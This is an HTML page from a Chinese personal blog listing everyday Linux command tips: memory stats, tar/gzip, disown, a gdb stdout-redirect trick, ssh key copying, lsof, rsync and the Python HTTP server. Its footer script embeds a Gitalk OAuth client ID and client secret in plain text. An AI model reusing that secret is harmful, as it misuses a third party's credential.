+<p>used——已使用内存，一般情况这个值会比较大，因为这个值包括了cache+应用程序使用的内存</p>
+<p>free——完全未被使用的内存</p>
+<p>shared——应用程序共享内存</p>
+<p>buffers——缓存，主要用于目录方面,inode值等（ls大目录可看到这个值增加）</p>
+<p>cached——缓存，用于已打开的文件</p>
+<h1 id="压缩解压"><a href="#压缩解压" class="headerlink" title="压缩解压"></a>压缩解压</h1><p>tar命令<br> 解包：tar zxvf FileName.tar<br> 打包：tar czvf FileName.tar DirName</p>
+<p>gz命令<br> 解压1：gunzip FileName.gz<br> 解压2：gzip -d FileName.gz<br> 压缩：gzip FileName<br> .tar.gz 和 .tgz<br> 解压：tar zxvf FileName.tar.gz<br> 压缩：tar zcvf FileName.tar.gz DirName<br> 压缩多个文件：tar zcvf FileName.tar.gz DirName1 DirName2 DirName3 ...</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disown</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 这是一个bash内置命令，如果你需要将当前程序在后台运行的时候，有两个方式，1.让当前程序在新的session中运行。2.程序内部处理SIGUP信号，nohup就只这种工作方式。disown这个命令也能达到相同的功能。更多内容参考: <a href="http://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/cn/linux/l-cn-nohup/" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-cn-nohup/</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch log</span><br><span class="line">gdb -p 22499</span><br><span class="line">(gdb) p close(1) # This closes the stdout of the running process</span><br><span class="line">(gdb) p open(&quot;/home/.../log&quot;, 1) # This will open the log-file with O_WRITE</span><br><span class="line">(gdb) c</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 这是一种非常hack的方式来将一个已经正在运行的程序的标准输出重定向到文件。更多内容参考: <a href="http://link.zhihu.com/?target=https%3A//github.com/nelhage/reptyr" target="_blank" rel="noopener">https://github.com/nelhage/reptyr</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_dsa.pub | ssh me@remotebox &quot;cat &gt;&gt; ~/.ssh/authorized_keys&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 通过ssh连接跨机器使用管道符,这也是比较hack的一种方式。顺便说一句，scp也是使用的ssh协议，所以在使用scp的时候，如果你配置了秘钥，那么scp是可以使用tab键来进行补全提示的。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fc</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> fc命令能够将上一次执行的命令在编辑器中打开,这个默认的编辑器可以使EDITOR环境变量来设置。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> lsof能够列出当前操作系统打开的所有文件描述符，包括socket,文件等等,与之类似还有一个<code>fuser</code>命令。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTRL + L</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 这是一个快捷键，和clear的功能一样能够快速清空当前的terminal,bash还有很多快捷键，请参考： <a href="http://link.zhihu.com/?target=https%3A//blog.hellojukay.cn/2018/05/23/20180523/" target="_blank" rel="noopener">https://blog.hellojukay.cn/2018/05/23/20180523/</a>。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man ascii</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 在mac上下能够按照是十六进制的方式处处ascii码表，很多从事嵌入式开发的程序使用这个小技巧，同样的<code>ascii -x</code>也能实现这个功能.</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xargs</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 能够将上一个程序的标准输出传给下一个程序的命令行，我最喜欢的功能是:<code>echo xx | xargs -I {} command {}</code>。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> convert命令能够进行图片格式转换。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^find^replace</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 这是一个比较冷门的用法，通常在你出入命令行错误，或者你在用另一个参数再次运行某个命令，用这种凡是来修改命令行，类似的哈有<code>!:s/find/replace</code>以及全局替换<code>!:gs/find/replace</code>。</p>
+</blockquote>
+<p><img src="https://pic3.zhimg.com/v2-2a47d453927495608ee41086f64d4ca1_b.jpg" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 这是一个同步，备份文件的命令。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iftop</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 这是一个监控网卡流量的命令，类似的监控io情况的命令有：iotop 。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo !!</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 使用sudo权限来执行上一条命令,换句话说，如果只是单纯的再次执行上一条命令就用<code>!!</code>即可。我习惯使用<code>CTRL + P</code>然后<code>CTRL + a</code>,然后输入sudo。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd -</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 这条命令能够将你待会上一次所在目录。关于目录跳转的还有另外一个很有意思的工具: <a href="http://link.zhihu.com/?target=https%3A//github.com/wting/autojump" target="_blank" rel="noopener">https://github.com/wting/autojump</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f file</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 能够监控文件的变化，实时输出到标准输出。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:w !sudo tee %</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 这是一条vim的内置命令，当你用普通用户编辑文件，但是没有权限保存的时候，这个条命令能够让你用sudo权限保存当前文件。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SipmleHTTPServe 8080</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 启动一个简单的http目录，暴露8080端口，将当前目录下的文件暴露出去。这是正对于python2版本，如果是python3环境，则使用<code>python -m http.server 8080</code>。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 文件格式化编排后输出到标准输出。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill/pgrep</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 按照名字查找进程号，类似<code>ps aux | grep name| awk &#39;{print $2}&#39;</code>。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pv</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 以进度条的方式显示命令行的执行进度。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pushd/popd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 这是是用堆栈的方式来进行目录跳转<code>pushd</code>跳转到目录目录，并将当前目录放在栈定，<code>pop</code>移除栈顶元素，回到上一次目录。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncdu</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 查看磁盘空间占用情况。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmidecode</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 或者当前系统的硬件信息。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htop</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 与top命令的功能类似，但是显示界面更加友好。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 这是非常hack的一个命令，能够调试一个脚本.</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnstat</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 一款linux下的性能监控工具。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -executable -type f</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 查找可执行文件。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tree</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 展示当前目录的树状结构。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pstree</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 显示一个正在运行中的程序的进程树状结构。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> ss 也就是 socket status ,用来展示socket讯通状态的命令，类似于 netstat 命令 。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sl</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> sl这是一个非常滑稽的命令，如果你想深入ls,但是不小心写错了，终端中会有一个小火车驶过。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2018/12/08/2018-12-08-Linux命令/" title="Linux命令">https://wh0ale.github.io/2018/12/08/2018-12-08-Linux命令/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/奇技淫巧/" rel="tag"><i class="fa fa-tag"></i># 奇技淫巧</a>
+          
+            <a href="/tags/Linux命令/" rel="tag"><i class="fa fa-tag"></i># Linux命令</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2018/12/01/2018-12-01-ddos详解/" rel="next" title="DDOS总结">
+                <i class="fa fa-chevron-left"></i> DDOS总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2018/12/10/2018-12-10-渗透测试之DNS/" rel="prev" title="渗透测试之DNS">
+                渗透测试之DNS <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Ruby"><span class="nav-number">1.</span> <span class="nav-text">Ruby</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#用户权限"><span class="nav-number">2.</span> <span class="nav-text">用户权限</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Sed"><span class="nav-number">3.</span> <span class="nav-text">Sed</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Nc"><span class="nav-number">4.</span> <span class="nav-text">Nc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bundle"><span class="nav-number">5.</span> <span class="nav-text">Bundle</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件目录"><span class="nav-number">6.</span> <span class="nav-text">文件目录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复制文件"><span class="nav-number">7.</span> <span class="nav-text">复制文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis"><span class="nav-number">8.</span> <span class="nav-text">Redis</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crontab"><span class="nav-number">9.</span> <span class="nav-text">Crontab</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ssh服务"><span class="nav-number">10.</span> <span class="nav-text">ssh服务</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Grep"><span class="nav-number">11.</span> <span class="nav-text">Grep</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dpkg"><span class="nav-number">12.</span> <span class="nav-text">dpkg</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SCP"><span class="nav-number">13.</span> <span class="nav-text">SCP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关机命令："><span class="nav-number">14.</span> <span class="nav-text">关机命令：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重启命令："><span class="nav-number">15.</span> <span class="nav-text">重启命令：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#桌面安装"><span class="nav-number">16.</span> <span class="nav-text">桌面安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#桌面美化"><span class="nav-number">17.</span> <span class="nav-text">桌面美化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#查找"><span class="nav-number">18.</span> <span class="nav-text">查找</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重启网络"><span class="nav-number">19.</span> <span class="nav-text">重启网络</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Alias"><span class="nav-number">20.</span> <span class="nav-text">Alias</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#删除软件"><span class="nav-number">21.</span> <span class="nav-text">删除软件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网络服务"><span class="nav-number">22.</span> <span class="nav-text">网络服务</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#更新源"><span class="nav-number">23.</span> <span class="nav-text">更新源</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#更新命令"><span class="nav-number">24.</span> <span class="nav-text">更新命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#卸载"><span class="nav-number">25.</span> <span class="nav-text">卸载</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#查看内核"><span class="nav-number">26.</span> <span class="nav-text">查看内核</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#清理命令："><span class="nav-number">27.</span> <span class="nav-text">清理命令：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#压缩解压"><span class="nav-number">28.</span> <span class="nav-text">压缩解压</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
